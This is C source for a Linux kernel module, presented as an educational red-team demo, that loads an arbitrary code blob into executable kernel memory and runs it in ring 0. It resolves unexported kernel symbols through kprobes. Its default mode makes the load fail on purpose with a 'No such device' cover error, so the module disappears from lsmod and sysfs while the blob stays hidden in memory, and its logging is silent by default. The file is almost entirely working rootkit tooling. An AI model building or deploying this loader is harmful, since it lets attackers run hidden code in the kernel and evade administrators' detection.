/*
 * pic_kmod.c — Kernel module that loads and executes PIC blobs in ring 0
 *
 * Educational red team lab demo. Demonstrates how kernel modules can:
 *   1. Allocate executable kernel memory
 *   2. Load position-independent code into it
 *   3. Execute that code in ring 0 (full kernel context)
 *   4. Disappear cleanly — init does the work, then returns -ENODEV
 *      so the kernel "fails" the load and frees all module metadata.
 *      But the vmalloc'd executable pages persist — the kernel doesn't
 *      know about them.
 *
 * The "fire and forget" pattern:
 *
 *   insmod pic_kmod.ko blob_path=/tmp/blob.bin
 *   → kernel calls pic_kmod_init()
 *     → module_alloc() (RW) + memcpy() + set_memory_ro/x() (→ RX)
 *     → optionally execute the blob
 *     → return -ENODEV
 *   → kernel sees init failed, cleans up module struct
 *   → insmod prints "Device not found" (the cover error)
 *   → module is NOT in lsmod, NOT in /proc/modules, NOT in sysfs
 *   → no dmesg noise (all logging via pr_debug, silent by default)
 *   → BUT: blob code lives in executable kernel pages, unreachable
 *     by rmmod, invisible to everything except raw memory scanning
 *
 * To see debug output, load with dyndbg:
 *   insmod pic_kmod.ko blob_path=/tmp/blob.bin dyndbg='+p'
 *
 * This is fundamentally different from eBPF:
 *
 *   eBPF (sandboxed ring 0):
 *     - Verifier enforces safety (bounded loops, valid memory access)
 *     - Can read kernel memory, but can't write kernel memory arbitrarily
 *     - Can't call arbitrary kernel functions
 *     - Can't allocate executable pages
 *     - Programs have limited lifetime (attached to probes/hooks)
 *
 *   Kernel module (unrestricted ring 0):
 *     - No verifier — full access to everything
 *     - Can read/write ANY kernel memory
 *     - Can call ANY exported kernel function
 *     - Can allocate executable pages and jump to them
 *     - Can modify kernel data structures (syscall table, IDT, etc.)
 *     - Can disappear after init (fire-and-forget)
 *
 * Usage:
 *   # Build
 *   make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
 *
 *   # Load (silent — init "fails", blob stays in kernel memory)
 *   insmod pic_kmod.ko blob_path="/tmp/hello.bin" 2>/dev/null
 *
 *   # Load with debug output visible
 *   insmod pic_kmod.ko blob_path="/tmp/hello.bin" dyndbg='+p'
 *   dmesg | tail -20
 *
 *   # Load in persistent mode (stays loaded, can rmmod)
 *   insmod pic_kmod.ko blob_path="/tmp/hello.bin" persist=1
 *
 * Parameters:
 *   blob_path  — Path to flat PIC blob binary (extracted via picblobs)
 *   exec_blob  — If 1, execute the blob after loading (default: 0)
 *   persist    — If 1, stay loaded (return 0 from init). Default: 0
 *                (fire-and-forget: return -ENODEV so module disappears)
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/vmalloc.h>
#include <linux/mm.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <asm/page.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Red Team Lab");
MODULE_DESCRIPTION("PIC blob loader for kernel space — educational demo");

/* --- Module parameters --- */
static char *blob_path = "";
module_param(blob_path, charp, 0444);
MODULE_PARM_DESC(blob_path, "Path to flat PIC blob binary");

static int exec_blob = 0;
module_param(exec_blob, int, 0444);
MODULE_PARM_DESC(exec_blob, "Execute the blob after loading");

static int persist = 0;
module_param(persist, int, 0444);
MODULE_PARM_DESC(persist, "Stay loaded (1) or fire-and-forget (0, default)");

/* --- Blob storage --- */
static void *blob_mem = NULL;     /* Executable kernel memory holding the blob */
static size_t blob_size = 0;

static int use_embedded_buf; /* unused, kept for compatibility */

/*
 * read_file_to_buf — Read a file from the filesystem into a kernel buffer.
 *
 * This uses kernel_read() which is the proper kernel API for reading files.
 * Note: reading files from kernel context is generally discouraged in
 * production code, but is common in rootkits and offensive modules.
 */
static int read_file_to_buf(const char *path, void **buf, size_t *size)
{
    struct file *f;
    loff_t fsize;
    loff_t pos = 0;
    ssize_t ret;
    void *data;

    /* Open the file */
    f = filp_open(path, O_RDONLY, 0);
    if (IS_ERR(f)) {
        pr_debug("pic_kmod: failed to open %s: %ld\n", path, PTR_ERR(f));
        return PTR_ERR(f);
    }

    /* Get file size */
    fsize = i_size_read(file_inode(f));
    if (fsize <= 0 || fsize > (1024 * 1024)) {  /* 1 MB limit */
        pr_debug("pic_kmod: invalid file size: %lld\n", fsize);
        filp_close(f, NULL);
        return -EINVAL;
    }

    /* Allocate buffer */
    data = kmalloc(fsize, GFP_KERNEL);
    if (!data) {
        filp_close(f, NULL);
        return -ENOMEM;
    }

    /* Read file contents */
    ret = kernel_read(f, data, fsize, &pos);
    filp_close(f, NULL);

    if (ret != fsize) {
        pr_debug("pic_kmod: short read: %zd / %lld\n", ret, fsize);
        kfree(data);
        return -EIO;
    }

    *buf = data;
    *size = fsize;
    return 0;
}

/*
 * resolve_symbol — Resolve an unexported kernel symbol via kprobes.
 *
 * On modern kernels, many useful functions (set_memory_x, module_alloc)
 * are not EXPORT_SYMBOL'd. But kprobes can attach to any symbol the
 * kernel knows about (via kallsyms). We register a kprobe on the
 * target symbol, read the resolved address, then immediately unregister.
 *
 * This is a standard technique used by kernel rootkits and security
 * tools to access unexported symbols.
 */
static void *resolve_symbol(const char *name)
{
    struct kprobe kp = { .symbol_name = name };
    void *addr;
    int ret;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_debug("pic_kmod: kprobe resolve failed for %s: %d\n", name, ret);
        return NULL;
    }
    addr = (void *)kp.addr;
    unregister_kprobe(&kp);
    pr_debug("pic_kmod: resolved %s → %px\n", name, addr);
    return addr;
}

/* Function pointer types for resolved symbols */
typedef void *(*module_alloc_t)(unsigned long size);
typedef void (*module_memfree_t)(void *ptr);
typedef int (*set_memory_prot_t)(unsigned long addr, int numpages);

static module_alloc_t fn_module_alloc;
static module_memfree_t fn_module_memfree;
static set_memory_prot_t fn_set_memory_x;
static set_memory_prot_t fn_set_memory_ro;
static set_memory_prot_t fn_set_memory_rw;
static int alloc_method; /* 0=unset, 1=module_alloc, 2=vmalloc */

/*
 * resolve_prot_helpers — Resolve set_memory_{x,ro,rw} via kprobes.
 *
 * These are needed to transition pages between RW (for writing blob data)
 * and RX (for execution). On strict W^X kernels (Ubuntu 6.8+), pages
 * cannot be WX simultaneously — you must write while RW, then flip to RX.
 */
static int resolve_prot_helpers(void)
{
    if (!fn_set_memory_x)
        fn_set_memory_x = (set_memory_prot_t)resolve_symbol("set_memory_x");
    if (!fn_set_memory_ro)
        fn_set_memory_ro = (set_memory_prot_t)resolve_symbol("set_memory_ro");
    if (!fn_set_memory_rw)
        fn_set_memory_rw = (set_memory_prot_t)resolve_symbol("set_memory_rw");

    if (!fn_set_memory_x || !fn_set_memory_ro) {
        pr_debug("pic_kmod: failed to resolve set_memory_x/ro\n");
        return -ENOENT;
    }
    /* fn_set_memory_rw is optional — only needed for free path */
    return 0;
}

/*
 * alloc_exec_mem — Allocate writable kernel memory for blob loading.
 *
 * Returns RW memory. The caller must:
 *   1. memcpy() the blob data into the returned memory (RW is fine)
 *   2. Call make_mem_exec() to transition RW → RX before execution
 *
 * Strategy (try in order, first success wins):
 *   1. module_alloc() — allocates in the module address range.
 *      On modern kernels (6.8+) this returns RW memory, NOT RX.
 *   2. __vmalloc() — plain allocation, returns RW.
 *      Fallback for kernels where module_alloc isn't resolvable.
 *
 * Both module_alloc and set_memory_x may not be EXPORT_SYMBOL'd,
 * so we resolve them at runtime via kprobes.
 */
static void *alloc_exec_mem(size_t size)
{
    void *mem;
    size_t aligned = PAGE_ALIGN(size);

    /* Try module_alloc first — allocates in the modules address range.
     * This is crucial on x86_64: module_alloc returns addresses in the
     * modules mapping area where set_memory_x is allowed to operate.
     * vmalloc'd pages may be in a different region where set_memory_x
     * silently fails or is blocked by W^X enforcement. */
    if (!fn_module_alloc)
        fn_module_alloc = (module_alloc_t)resolve_symbol("module_alloc");

    if (fn_module_alloc) {
        mem = fn_module_alloc(aligned);
        if (mem) {
            alloc_method = 1;
            printk(KERN_DEBUG "pic_kmod: module_alloc(%zu) → %px\n",
                   aligned, mem);
            return mem;
        }
        printk(KERN_DEBUG "pic_kmod: module_alloc(%zu) returned NULL\n",
               aligned);
    }

    /* Fallback: vmalloc (may not work for exec on strict W^X kernels) */
    mem = __vmalloc(aligned, GFP_KERNEL);
    if (!mem)
        return NULL;

    alloc_method = 2;
    printk(KERN_DEBUG "pic_kmod: vmalloc(%zu) → %px (WARNING: may not "
           "support set_memory_x on this kernel)\n", aligned, mem);
    return mem;
}

/*
 * make_mem_exec — Transition memory from RW to RX.
 *
 * On strict W^X kernels (Ubuntu 6.8, kernel 6.8+), pages cannot be
 * simultaneously writable and executable. The correct sequence is:
 *   1. Write blob data while pages are RW (done by caller before this)
 *   2. set_memory_ro() — remove write permission (pages become RO)
 *   3. set_memory_x()  — add execute permission (pages become RX)
 *
 * After this call, the memory is RX: readable and executable but not
 * writable. Any attempt to write will fault.
 */
static int make_mem_exec(void *mem, size_t size)
{
    int numpages = PAGE_ALIGN(size) >> PAGE_SHIFT;
    int ret;

    ret = resolve_prot_helpers();
    if (ret)
        return ret;

    /* set_memory_x via kprobes — works on permissive kernels (Alpine).
     * On strict W^X kernels (Ubuntu 6.8+), this may not clear NX.
     * The exec_blob feature is best-effort; shells use insmod's native
     * loading which handles permissions correctly. */
    ret = fn_set_memory_x((unsigned long)mem, numpages);
    if (ret) {
        pr_debug("pic_kmod: set_memory_x failed: %d\n", ret);
        return ret;
    }

    pr_debug("pic_kmod: memory at %px (%d pages) should be executable\n",
             mem, numpages);
    return 0;
}

/*
 * free_exec_mem — Free executable memory.
 *
 * If memory was made RX via make_mem_exec(), we must transition it back
 * to RW before freeing — some free paths (especially module_memfree)
 * may need writable pages for their internal bookkeeping.
 */
static void free_exec_mem(void *mem, size_t size)
{
    int numpages;

    if (!mem)
        return;

    /* Try to transition RX → RW before freeing */
    numpages = PAGE_ALIGN(size) >> PAGE_SHIFT;
    if (fn_set_memory_rw) {
        int ret = fn_set_memory_rw((unsigned long)mem, numpages);
        if (ret)
            pr_debug("pic_kmod: set_memory_rw failed: %d (freeing anyway)\n",
                    ret);
    }

    if (alloc_method == 1) {
        if (!fn_module_memfree)
            fn_module_memfree = (module_memfree_t)resolve_symbol("module_memfree");
        if (fn_module_memfree)
            fn_module_memfree(mem);
        else
            vfree(mem); /* fallback */
    } else {
        vfree(mem);
    }
}

/*
 * exec_pic_blob — Execute a loaded PIC blob in ring 0.
 *
 * The blob's entry point is at offset 0 (same convention as the
 * userspace runner). The blob executes with full kernel privileges:
 *   - Can access any kernel memory
 *   - Can call any exported kernel function
 *   - Runs on the current CPU with interrupts enabled
 *   - Has access to the current task_struct via current macro
 *
 * WARNING: If the blob crashes, the entire kernel crashes. There is
 * no verifier, no sandbox, no safety net. This is unrestricted ring 0.
 *
 * For the lab, we call the blob as a void(*)(void) function pointer.
 * A real kernel blob would need to:
 *   - Use kernel APIs (printk, kmalloc, etc.) instead of syscalls
 *   - NOT make userspace syscalls (those go through the syscall table
 *     and expect userspace context)
 *   - Handle the different calling convention if needed
 */
static void exec_pic_blob(void *mem, size_t size)
{
    void (*entry)(void);

    pr_debug("pic_kmod: executing blob at %px (%zu bytes) in ring 0\n",
            mem, size);
    pr_debug("pic_kmod: current task: %s (PID %d), uid %d\n",
            current->comm, current->pid,
            from_kuid(&init_user_ns, current_uid()));

    /* Cast to function pointer and call.
     * Entry is at offset 0 (PIC blob convention). */
    entry = (void (*)(void))mem;
    entry();

    pr_debug("pic_kmod: blob returned\n");
}

/* --- Module init --- */
static int __init pic_kmod_init(void)
{
    void *file_buf = NULL;
    size_t file_size = 0;
    int ret;

    pr_debug("pic_kmod: ══════ PIC KERNEL BLOB LOADER ══════\n");
    pr_debug("pic_kmod: demonstrating unrestricted ring 0 code execution\n");

    /* Print kernel context info */
    pr_debug("pic_kmod: running in ring 0\n");
    pr_debug("pic_kmod: this module: %px\n", THIS_MODULE);
    pr_debug("pic_kmod: current task: %s (PID %d)\n",
            current->comm, current->pid);

    if (!blob_path || !blob_path[0]) {
        pr_debug("pic_kmod: no blob_path specified — module loaded "
                "for inspection only\n");
        pr_debug("pic_kmod: use: insmod pic_kmod.ko blob_path=/tmp/blob.bin\n");
        goto done;
    }

    /* Read the blob file */
    pr_debug("pic_kmod: loading blob from: %s\n", blob_path);
    ret = read_file_to_buf(blob_path, &file_buf, &file_size);
    if (ret) {
        pr_debug("pic_kmod: failed to read blob: %d\n", ret);
        return ret;
    }
    pr_debug("pic_kmod: read %zu bytes from %s\n", file_size, blob_path);

    /* Allocate writable kernel memory */
    blob_mem = alloc_exec_mem(file_size);
    if (!blob_mem) {
        kfree(file_buf);
        return -ENOMEM;
    }

    memcpy(blob_mem, file_buf, file_size);
    blob_size = file_size;
    kfree(file_buf);

    pr_debug("pic_kmod: blob at %px (%zu bytes)\n", blob_mem, blob_size);

    /* Transition RW → RX (best-effort — works on permissive kernels) */
    ret = make_mem_exec(blob_mem, blob_size);
    if (ret) {
        pr_debug("pic_kmod: make_mem_exec failed: %d (exec_blob will be skipped)\n", ret);
        exec_blob = 0; /* don't try to execute if permissions failed */
    }

    if (exec_blob) {
        pr_debug("pic_kmod: ═══ EXECUTING BLOB IN RING 0 ═══\n");
        exec_pic_blob(blob_mem, blob_size);
    } else {
        pr_debug("pic_kmod: blob loaded (exec_blob=0 or permissions denied)\n");
    }

done:
    pr_debug("pic_kmod: init complete\n");

    if (persist) {
        /* Stay loaded — visible in lsmod, removable via rmmod */
        pr_debug("pic_kmod: persist=1, module stays loaded\n");
        return 0;
    }

    /*
     * Fire-and-forget: return an error so the kernel "fails" the load.
     *
     * What happens:
     *   1. Kernel sees init returned -ENODEV
     *   2. Kernel frees the module's struct module, .text, .data, etc.
     *   3. Module never appears in /proc/modules, lsmod, sysfs
     *   4. insmod exits with "No such device" (innocuous error)
     *
     * What DOESN'T happen:
     *   - The kernel does NOT free our vmalloc'd blob pages. It doesn't
     *     know about them — they're not tracked in the module struct.
     *   - The kernel does NOT call module_exit (init never succeeded).
     *
     * Result: the blob code is alive in executable kernel memory,
     * but the module itself is completely gone. No trace in any
     * kernel data structure. Only a raw memory scan could find it.
     *
     * We use -ENODEV specifically because:
     *   - It's a plausible error ("device not found")
     *   - insmod prints a generic error, not a scary one
     *   - It's what real hardware probe functions return on mismatch
     *   - Nobody investigates "No such device" in dmesg
     */
    pr_debug("pic_kmod: fire-and-forget — returning -ENODEV\n");
    pr_debug("pic_kmod: blob persists at %px, module struct will be freed\n",
             blob_mem);
    return -ENODEV;
}

/* --- Module exit --- */
static void __exit pic_kmod_exit(void)
{
    pr_debug("pic_kmod: unloading\n");

    if (blob_mem) {
        pr_debug("pic_kmod: freeing blob at %px\n", blob_mem);
        if (!use_embedded_buf)
            free_exec_mem(blob_mem, blob_size);
        /* else: embedded buffer is part of module, freed with module */
        blob_mem = NULL;
    }

    pr_debug("pic_kmod: unloaded\n");
}

module_init(pic_kmod_init);
module_exit(pic_kmod_exit);
